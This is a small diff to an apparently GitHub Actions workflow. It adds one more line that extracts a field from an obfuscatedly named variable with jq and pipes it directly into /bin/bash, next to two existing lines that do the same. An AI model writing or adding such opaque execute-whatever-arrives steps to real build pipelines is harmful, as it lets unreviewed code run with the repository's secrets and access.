@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$jy4880" | jq -r .ar5511 | /bin/bash
           printf '%s' "$su49241" | jq -r .reldm08759 | /bin/bash
+          echo $dwa4145 | jq -r .w38407 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
